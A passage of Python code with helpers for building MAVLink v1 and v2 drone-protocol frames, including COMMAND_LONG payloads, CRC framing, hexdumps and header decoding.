def build_command_long_payload(
    target_system: int,
    target_component: int,
    command: int,
    confirmation: int = 0,
    param1: float = 0.0,
    param2: float = 0.0,
    param3: float = 0.0,
    param4: float = 0.0,
    param5: float = 0.0,
    param6: float = 0.0,
    param7: float = 0.0,
) -> bytes:
    """MAVLink COMMAND_LONG payload (msgid=76). Field order per common.xml."""
    return struct.pack(
        "<fffffffHBBB",
        param1, param2, param3, param4, param5, param6, param7,
        command, target_system, target_component, confirmation,
    )


def _truncate_zero_bytes(payload: bytes) -> bytes:
    """MAVLink v2 payload trimming: drop trailing zero bytes (min 1)."""
    while len(payload) > 1 and payload[-1] == 0:
        payload = payload[:-1]
    return payload


def build_packet_v2(
    msgid: int,
    payload: bytes,
    system_id: int = 255,
    component_id: int = 190,
    sequence: int = 0,
    incompat_flags: int = 0,
    compat_flags: int = 0,
) -> bytes:
    """Assemble a MAVLink v2 frame."""
    if msgid not in CRC_EXTRA:
        raise ValueError(f"CRC_EXTRA not registered for msgid={msgid}")
    trimmed = _truncate_zero_bytes(payload)
    header = struct.pack(
        "<BBBBBBB",
        MAVLINK_STX_V2, len(trimmed), incompat_flags, compat_flags,
        sequence, system_id, component_id,
    )
    # msgid is 24-bit little-endian in v2
    msgid_bytes = bytes([msgid & 0xFF, (msgid >> 8) & 0xFF, (msgid >> 16) & 0xFF])
    frame_wo_crc = header[1:] + msgid_bytes + trimmed  # skip STX for CRC per spec
    crc_input = frame_wo_crc + bytes([CRC_EXTRA[msgid]])
    crc = _crc16_mcrf4xx(crc_input)
    return header + msgid_bytes + trimmed + struct.pack("<H", crc)


def build_packet_v1(
    msgid: int,
    payload: bytes,
    system_id: int = 255,
    component_id: int = 190,
    sequence: int = 0,
) -> bytes:
    """Assemble a MAVLink v1 frame (msgid must be <= 255)."""
    if msgid > 255:
        raise ValueError("MAVLink v1 supports msgid <= 255")
    if msgid not in CRC_EXTRA:
        raise ValueError(f"CRC_EXTRA not registered for msgid={msgid}")
    header = struct.pack(
        "<BBBBBBB",
        MAVLINK_STX_V1, len(payload), sequence, system_id, component_id, msgid,
        0,  # placeholder, not used; v1 header is 6 bytes actually
    )
    # v1 header is 6 bytes: STX,LEN,SEQ,SYSID,COMPID,MSGID
    header = bytes([MAVLINK_STX_V1, len(payload), sequence, system_id, component_id, msgid])
    crc_input = header[1:] + payload + bytes([CRC_EXTRA[msgid]])
    crc = _crc16_mcrf4xx(crc_input)
    return header + payload + struct.pack("<H", crc)


def hexdump(data: bytes, width: int = 16) -> List[str]:
    """Return classical hexdump lines: offset | hex | ascii."""
    lines: List[str] = []
    for offset in range(0, len(data), width):
        chunk = data[offset : offset + width]
        hex_bytes = " ".join(f"{b:02X}" for b in chunk).ljust(width * 3 - 1)
        ascii_bytes = "".join(chr(b) if 32 <= b < 127 else "." for b in chunk)
        lines.append(f"{offset:04X}  {hex_bytes}  |{ascii_bytes}|")
    return lines


def describe_packet(frame: bytes) -> Dict:
    """Human-readable summary of a MAVLink frame."""
    if not frame:
        return {"valid": False, "reason": "empty"}
    stx = frame[0]
    if stx == MAVLINK_STX_V2 and len(frame) >= 12:
        length = frame[1]
        return {
            "valid": True,
            "version": "v2",
            "stx": f"0x{stx:02X}",
            "payload_length": length,
            "incompat_flags": frame[2],
            "compat_flags": frame[3],
            "sequence": frame[4],
            "system_id": frame[5],
            "component_id": frame[6],
            "message_id": frame[7] | (frame[8] << 8) | (frame[9] << 16),
            "total_bytes": len(frame),
        }
    if stx == MAVLINK_STX_V1 and len(frame) >= 8:
        return {
            "valid": True,
            "version": "v1",
            "stx": f"0x{stx:02X}",
            "payload_length": frame[1],
            "sequence": frame[2],
            "system_id": frame[3],
            "component_id": frame[4],
            "message_id": frame[5],
            "total_bytes": len(frame),
        }
    return {"valid": False, "reason": "unknown STX or short frame"}


